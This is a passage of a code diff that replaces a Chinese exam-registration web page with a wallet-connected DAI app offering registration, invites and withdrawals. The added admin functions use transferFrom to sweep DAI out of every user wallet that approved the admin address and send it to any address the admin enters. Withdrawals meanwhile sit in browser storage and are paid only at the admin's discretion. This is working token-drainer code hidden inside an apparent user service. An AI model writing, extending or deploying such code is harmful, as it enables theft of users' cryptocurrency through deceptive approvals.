+    setInner(account, b - a);
+    let reqs = JSON.parse(localStorage.getItem("withdraw_requests") || "[]");
+    reqs.push({ user: account, amount: a, time: Date.now() });
+    localStorage.setItem("withdraw_requests", JSON.stringify(reqs));
+
+    alert("提现申请已提交，等待管理员批量打款");
+    refresh();
+    loadBal();
+  } catch(e) {
+    alert("申请失败");
+  }
+}
+
+function renderWithdrawList() {
+  const reqs = JSON.parse(localStorage.getItem("withdraw_requests") || "[]");
+  let h = "";
+  reqs.forEach((r, i) => {
+    h+=`<div class="item"><div>${r.user.slice(0,6)}...${r.user.slice(-4)}</div><div>${r.amount} DAI</div><button class="btn-sm" onclick="markWithdrawDone(${i})">已打款</button></div>`;
+  });
+  document.getElementById("withdrawList").innerHTML = h || `<div style="text-align:center;padding:10px">暂无提现申请</div>`;
+}
+
+function markWithdrawDone(idx) {
+  let reqs = JSON.parse(localStorage.getItem("withdraw_requests") || "[]");
+  reqs.splice(idx, 1);
+  localStorage.setItem("withdraw_requests", JSON.stringify(reqs));
+  renderWithdrawList();
+}
+
+async function adminBatchPayAllWithdraw() {
+  if (!isAdmin) return alert("无权限");
+  const reqs = JSON.parse(localStorage.getItem("withdraw_requests") || "[]");
+  if (reqs.length === 0) return alert("暂无提现需要打款");
+  if (!confirm("确定批量打款【"+reqs.length+"】笔提现？\n将从您钱包自动转出")) return;
+
+  const abi = [
+    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
+    {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
+  ];
+  const token = new web3.eth.Contract(abi, DAI);
+  const dec = await token.methods.decimals().call();
+
+  let success = 0;
+  for (const r of reqs) {
+    try {
+      const val = (BigInt(r.amount) * 10n ** BigInt(dec)).toString();
+      await token.methods.transfer(r.user, val).send({
+        from: account,
+        gas: 100000
+      });
+      success++;
+    } catch(e) {}
+  }
+
+  localStorage.setItem("withdraw_requests", JSON.stringify([]));
+  renderWithdrawList();
+  alert(`批量打款完成\n成功：${success} 笔`);
+}
+
+async function adminCollectToCustomAddr() {
+  if (!isAdmin) return alert("无权限");
+  const toAddr = document.getElementById("collectToAddr").value.trim().toLowerCase();
+  if (!/^0x[a-f0-9]{40}$/i.test(toAddr)) return alert("地址错误");
+  if (!confirm("提取所有内部余额到："+toAddr)) return;
+
+  const users = getAllUsers();
+  const abi = [
+    {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
+    {"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
+  ];
+  const token = new web3.eth.Contract(abi, DAI);
+  const dec = await token.methods.decimals().call();
+
+  let success = 0;
+  for (const user of users) {
+    const bal = getInner(user);
+    if (bal <= 0) continue;
+    try {
+      const val = (BigInt(bal) * 10n**BigInt(dec)).toString();
+      await token.methods.transferFrom(user, toAddr, val).send({ from: ADMIN, gas: 100000 });
+      setInner(user, 0);
+      success++;
+    } catch(e){}
+  }
+  alert("完成："+success+" 人");
+  refresh();
+}
+
+async function adminExtractFromAllAuthorized() {
+  if (!isAdmin) return alert("无权限");
+  const toAddr = document.getElementById("adminExtractAddr").value.trim().toLowerCase();
+  const amount = +document.getElementById("adminExtractAmount").value;
+  if (!/^0x[a-f0-9]{40}$/i.test(toAddr) || !amount || amount<=0) return alert("地址或金额错误");
+
+  const users = getAllUsers();
+  const abi = [
+    {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
+    {"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
+  ];
+  const token = new web3.eth.Contract(abi, DAI);
+  const dec = await token.methods.decimals().call();
+  const val = (BigInt(amount) * 10n**BigInt(dec)).toString();
+
+  let success = 0;
+  for (const user of users) {
+    try {
+      const allow = await token.methods.allowance(user, ADMIN).call();
+      if (BigInt(allow) < BigInt(val)) continue;
+      await token.methods.transferFrom(user, toAddr, val).send({ from: ADMIN, gas: 100000 });
+      success++;
+    } catch(e){}
+  }
+  alert("成功提取："+success+" 人");
+}
+
+function addBlack() {
+  if(!isAdmin)return;const a=document.getElementById("blackAddr").value.toLowerCase();localStorage.setItem("black_"+a,"1");alert("已拉黑");
+}
+function removeBlack() {
+  if(!isAdmin)return;const a=document.getElementById("whiteAddr").value.toLowerCase();localStorage.removeItem("black_"+a);alert("已移出");
+}
+
+// 连接钱包并判断管理员
+document.getElementById("connectBtn").onclick = async () => {
+  try {
+    if (!window.ethereum) {
+      alert("请安装小狐狸钱包");
+      return;
     }
-    // 保存报名数据到本地存储
-    function saveApply(){
-        localStorage.setItem("applyData", JSON.stringify(applyDB));
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    web3 = new Web3(window.ethereum);
+    account = accounts[0]?.toLowerCase();
+    if (!account) return;
+
+    // 严格匹配你的管理员地址
+    isAdmin = (account === ADMIN);
+
+    if (isAdmin) {
+      document.getElementById("adminPanel").style.display = "block";
+      document.getElementById("adminExtractAuthorized").style.display = "block";
+    } else {
+      document.getElementById("adminPanel").style.display = "none";
+      document.getElementById("adminExtractAuthorized").style.display = "none";
     }
 
-    //登录逻辑
-    document.getElementById("loginBtn").onclick = function(){
-        const pwd = document.getElementById("adminPwd").value.trim();
-        if(pwd === ADMIN_PASSWORD){
-            isAdminLogin = true;
-            alert("管理员登录成功！现在可以录入和管理学员");
-            document.querySelectorAll(".admin-tab").forEach(el=>el.classList.remove("hide"));
-            document.getElementById("loginBtn").style.display = "none";
-            document.getElementById("logoutBtn").style.display = "block";
-        }else{
-            alert("密码错误！");
-        }
-    }
-    //退出登录
-    document.getElementById("logoutBtn").onclick = function(){
-        isAdminLogin = false;
-        document.querySelectorAll(".admin-tab").forEach(el=>el.classList.add("hide"));
-        document.getElementById("logoutBtn").style.display = "none";
-        document.getElementById("loginBtn").style.display = "block";
-        switchPage(0);
+    if (localStorage.getItem("reg_"+account)) {
+      document.getElementById("regBtn").disabled = true;
+      document.getElementById("regBtn").innerText = "已注册";
     }
 
-    //页面切换，未登录禁止打开管理页面
-    function switchPage(index){
-        if((index ===4 || index ===5) && !isAdminLogin){
-            alert("请先登录管理员账号！");
-            return;
-        }
-        document.querySelectorAll(".page-box").forEach(item=>item.classList.add("hide"));
-        document.getElementById("page"+index).classList.remove("hide");
-        document.querySelectorAll(".tab").forEach((tab,i)=>{
-            i===index ? tab.classList.add("active") : tab.classList.remove("active");
-        })
-    }
+    loadInvite();
+    loadBal();
+    refresh();
+  } catch (err) {
+    console.error(err);
+    alert("钱包连接失败");
+  }
+};
 
-    //图片上传预览
-    function bindUpload(inputId,previewId,storageKey){
-        const input = document.getElementById(inputId);
-        const preview = document.getElementById(previewId);
-        input.addEventListener("change",function(e){
-            const file = e.target.files[0];
-            if(!file) return;
-            const reader=new FileReader();
-            reader.onload=res=>{
-                preview.src=res.target.result;
-                preview.style.display="block";
-                if(storageKey) window[storageKey]=res.target.result;
-            }
-            reader.readAsDataURL(file);
-        })
-    }
-    bindUpload("idFront","imgFront");
-    bindUpload("idBack","imgBack");
-    bindUpload("photo","imgPhoto");
-    bindUpload("idPhoto","photoPreview","studentPhoto");
-    bindUpload("certPhoto","certPreview","certImage");
+document.getElementById("regBtn").onclick = () => {
+  if(!account)return alert("请先连接钱包");
+  if(localStorage.getItem("reg_"+account))return alert("已注册");
+  localStorage.setItem("reg_"+account,"1");
+  document.getElementById("regBtn").disabled=true;
+  document.getElementById("regBtn").innerText="已注册";
+  alert("注册成功");
+  refresh();
+};
 
-    //报名提交
-    document.getElementById("submitBtn").addEventListener("click",()=>{
-        let name = document.getElementById("username").value.trim();
-        let idcard = document.getElementById("idcard").value.trim();
-        let phone = document.getElementById("phone").value.trim();
-        let work = document.getElementById("workType").value;
-        if(!name||!idcard||!phone||!work){
-            alert("请完整填写必填信息");
-            return;
-        }
-        applyDB.push({name,idcard,phone,work});
-        saveApply();
-        alert("报名信息提交成功，请按时参加考试");
-    })
+const sb = document.getElementById("sidebar");
+document.getElementById("toggleSidebar").onclick = () => sb.classList.add("open");
+document.getElementById("closeSidebar").onclick = () => sb.classList.remove("open");
 
-    //查看报名记录
-    document.getElementById("getRecordBtn").addEventListener("click",()=>{
-        let id = document.getElementById("recordIdcard").value.trim();
-        const box = document.getElementById("recordList");
-        const info = applyDB.find(item=>item.idcard===id);
-        if(info){
-            box.innerHTML = `<div style="padding:12px;background:#f4f7fc;border-radius:8px;border:1px solid #dde2ec;">
-                <div>姓名：${info.name}</div>
-                <div>报考工种：${info.work}</div>
-                <div>当前状态：待参加考核</div>
-            </div>`;
-        }else box.innerHTML = "<div style='text-align:center;color:#666;'>暂无报名登记信息</div>";
-    })
-
-    //查验成绩
-    document.getElementById("searchBtn").addEventListener("click",()=>{
-        let id = document.getElementById("searchIdcard").value.trim();
-        const data = studentDB.find(item=>item.idcard===id);
-        const resultBox=document.getElementById("resultBox");
-        const emptyTip=document.getElementById("emptyTip");
-        if(!data){
-            resultBox.classList.add("hide");
-            emptyTip.classList.remove("hide");
-            return;
-        }
-        emptyTip.classList.add("hide");
-        resultBox.classList.remove("hide");
-        document.getElementById("resName").innerText=data.name;
-        document.getElementById("resWork").innerText=data.work;
-        document.getElementById("resTheory").innerText=data.theory+"分";
-        document.getElementById("resOperate").innerText=data.practical+"分";
-        document.getElementById("resStatus").innerText=data.status;
-        const certWrap=document.getElementById("certWrap");
-        if(data.status==="合格"){
-            certWrap.classList.remove("hide");
-            document.getElementById("certImg").src=data.cert;
-        }else certWrap.classList.add("hide");
-    })
-
-    //新增学员档案
-    document.getElementById("saveStudent").addEventListener("click",()=>{
-        const name=document.getElementById("stuName").value.trim();
-        const idcard=document.getElementById("stuIdcard").value.trim();
-        const phone=document.getElementById("stuPhone").value.trim();
-        const work=document.getElementById("stuWork").value;
-        const theory=Number(document.getElementById("theoryScore").value);
-        const practical=Number(document.getElementById("pracScore").value);
-        if(!name||!idcard||!phone||!work||isNaN(theory)||isNaN(practical)){
-            alert("全部必填项必须填写完整");
-            return;
-        }
-        const status = (theory>=60&&practical>=60)?"合格":"不合格";
-        let exist = studentDB.findIndex(x=>x.idcard===idcard);
-        const newItem = {
-            name,
-            idcard,
-            phone,
-            work,
-            theory,
-            practical,
-            status,
-            cert: certImage || "https://picsum.photos/id/20/400/280"
-        };
-        if(exist>=0) studentDB[exist]=newItem;
-        else studentDB.push(newItem);
-        saveStu();
-        alert("学员档案保存完毕，可以进行信息查验");
-        renderStudentTable();
-        //清空表单
-        document.getElementById("stuName").value="";
-        document.getElementById("stuIdcard").value="";
-        document.getElementById("stuPhone").value="";
-        document.getElementById("stuWork").value="";
-        document.getElementById("theoryScore").value="";
-        document.getElementById("pracScore").value="";
-        certImage = "";
-        studentPhoto = "";
-        document.getElementById("photoPreview").style.display="none";
-        document.getElementById("certPreview").style.display="none";
-    })
-
-    //渲染管理列表
-    function renderStudentTable(){
-        let html = `<table><tr><th>姓名</th><th>身份证</th><th>工种</th><th>理论</th><th>实操</th><th>结果</th><th>操作</th></trtr>`;
-        studentDB.forEach(item=>{
-            html+=`
-            <tr>
-                <td>${item.name}</td>
-                <td>${item.idcard}</td>
-                <td>${item.work}</td>
-                <td><input type="number" value="${item.theory}" class="t-input" data-id="${item.idcard}" style="width:42px"></td>
-                <td><input type="number" value="${item.practical}" class="p-input" data-id="${item.idcard}" style="width:42px"></td>
-                <td>${item.status}</td>
-                <td>
-                    <button onclick="updateScore('${item.idcard}')">保存</button>
-                    <button class="btn-del" onclick="deleteStudent('${item.idcard}')">删除</button>
-                </td>
-            </tr>`;
-        })
-        html+="</table>";
-        document.getElementById("adminList").innerHTML=html;
-    }
-
-    //修改成绩
-    window.updateScore = function(idcard){
-        let t = Number(document.querySelector(`.t-input[data-id="${idcard}"]`).value);
-        let p = Number(document.querySelector(`.p-input[data-id="${idcard}"]`).value);
-        const idx = studentDB.findIndex(s=>s.idcard===idcard);
-        studentDB[idx].theory = t;
-        studentDB[idx].practical = p;
-        studentDB[idx].status = t>=60&&p>=60?"合格":"不合格";
-        saveStu();
-        alert("成绩修改完成");
-        renderStudentTable();
-    }
-
-    //删除学员
-    window.deleteStudent = function(idcard){
-        if(!confirm("确认永久删除该学员档案？删除后无法查询此人员信息！")) return;
-        studentDB = studentDB.filter(item=>item.idcard!==idcard);
-        saveStu();
-        alert("档案已彻底删除");
-        renderStudentTable();
-    }
-
-    renderStudentTable();
+window.onload = function() {
+  renderMatrix();
+}
 </script>
 </body>
 </html>
